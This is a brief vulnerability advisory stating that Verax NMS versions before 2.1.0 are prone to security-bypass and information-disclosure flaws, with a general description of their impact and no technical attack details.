Verax NMS is prone to multiple security-bypass and information disclosure vulnerabilities.

Attackers can exploit these issues to bypass certain security restrictions, perform unauthorized actions, and obtain sensitive information; this may aid in launching further attacks.

Versions prior to Verax NMS 2.1.0 are vulnerable.
